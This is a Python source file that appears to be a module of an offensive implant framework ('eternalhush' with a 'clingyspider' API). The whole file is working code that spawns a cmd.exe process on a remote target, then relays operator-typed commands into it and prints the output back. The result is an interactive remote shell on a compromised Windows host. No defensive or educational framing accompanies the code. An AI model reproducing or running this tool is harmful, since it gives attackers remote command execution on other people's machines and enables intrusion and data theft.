import eternalhush as eh
from additional.clingyspider import api
from additional.clingyspider import const
import os
import time

def main(args):
    if not args.delay:
        args.delay = 500

    eh.ui.Echo("Creating remote 'cmd.exe' process", eh.ECHO_WARNING)
    retn = api.CreateProcess("cmd.exe", "", 0)
    if not retn:
        eh.ui.Echo("Failed to create remote process 'cmd.exe'", eh.ECHO_ERROR)
        return
    time.sleep(1)
    read_handle = retn.hread.get(int)
    write_handle = retn.hwrite.get(int)
    process_handle = retn.hprocess.get(int)    
    thread_handle = retn.hthread.get(int)
    thread_id = retn.tid.get(int)
    process_id = retn.pid.get(int)
    
    eh.ui.Echo("Created remote process 'cmd.exe'", eh.ECHO_GOOD)
    eh.ui.Echo("Type 'exit' to end cmd session", eh.ECHO_GOOD)

    text = api.ReadFile(read_handle).decode("cp866", errors="replace")
    eh.ui.Echo(text, eh.ECHO_DEFAULT)
    while True:
        try:
            cmd = eh.ui.Dialog("SHELL INPUT >>")
            if cmd == "exit":
                break
            api.WriteFile(write_handle, cmd.encode()+b"\n")
            time.sleep(args.delay * 0.001)
            text = api.ReadFile(read_handle).decode("cp866", errors="replace")
            if text == None:
                eh.ui.Echo(f"Failed to read from remote pipe")
                return
            eh.ui.Echo(text[len(cmd):], eh.ECHO_DEFAULT)
        except eh.exception.ExceptionTaskAborted:
            break
    
    api.TerminateProcess(process_handle, 0)
    
    api.CloseFile(write_handle)
    api.CloseFile(read_handle)
    api.CloseFile(process_handle)
    api.CloseFile(thread_handle)
    
    


